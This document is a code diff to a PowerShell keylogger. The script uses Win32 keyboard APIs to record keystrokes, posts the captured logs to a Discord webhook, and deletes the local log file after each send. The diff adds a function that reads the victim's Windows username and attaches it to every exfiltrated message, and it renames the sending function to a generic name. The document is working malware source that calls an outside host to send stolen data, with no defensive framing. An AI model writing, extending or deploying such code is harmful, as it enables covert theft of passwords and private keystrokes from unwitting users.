@@ -14,13 +14,21 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
 
-function Send-DiscordMessage {
+function Get-Username {
+    $username = (Get-WmiObject -Class Win32_ComputerSystem).UserName
+    return $username -replace '.*\\', ''
+}
+
+function Send-Message {
     param (
         [string]$Content
     )
 
+    $username = Get-Username
+    $contentWithUser = "User: $username`n$content"
+
     try {
-        $body = @{ content = $Content } | ConvertTo-Json
+        $body = @{ content = $contentWithUser } | ConvertTo-Json
         Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
     } catch {
     }
@@ -44,10 +52,10 @@ function SendKeylogsFromFile {
         if (Test-Path $keylogFilePath) {
             $keylogs = Get-Content -Path $keylogFilePath -Raw
             $formattedLogs = "Key Logs:`n" + $keylogs -replace '\n', "`n"
-            Send-DiscordMessage -Content $formattedLogs
+            Send-Message -Content $formattedLogs
             Remove-Item -Path $keylogFilePath -Force
         } else {
-            Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
+            Send-Message -Content "No keystrokes recorded in the last 30 seconds."
         }
     } catch {
     }
